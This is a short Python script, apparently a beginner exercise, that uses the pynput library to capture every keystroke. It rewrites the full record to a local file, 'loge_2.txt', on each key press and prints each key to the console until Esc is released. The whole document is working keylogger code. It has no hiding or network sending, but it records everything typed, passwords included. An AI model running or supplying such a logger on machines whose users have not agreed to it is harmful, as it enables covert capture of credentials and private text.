from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)
    
    try:
        print('alphanumaric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))
        
def write_file(keys):
    with open('loge_2.txt', 'w') as f:
        for key in keys:
            k = str(key).replace("'", " ")
            f.write(k)
            f.write(' ')
            
def on_relase(key):
    print('{0} relased'.format(key))
    if key == Key.esc:
        return False
    
with Listener (on_press=on_press, on_release=on_relase) as listner:
    listner.join()